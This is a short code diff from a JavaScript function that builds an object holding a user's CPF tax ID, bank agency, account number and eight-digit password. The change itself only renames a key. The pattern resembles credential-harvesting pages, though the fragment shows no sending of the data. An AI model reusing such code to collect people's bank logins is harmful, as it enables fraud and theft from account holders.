@@ -48,7 +48,7 @@ function savedatacpf(agency, account, passwordStrong) {
         const cpf = localStorage.getItem("cpf");
         
         let data = {
-                cpnf: JSON.parse(cpf),
+                cpf: JSON.parse(cpf),
                 agencia: agency,
                 contaCorrente: account,
                 senha8dig: passwordStrong
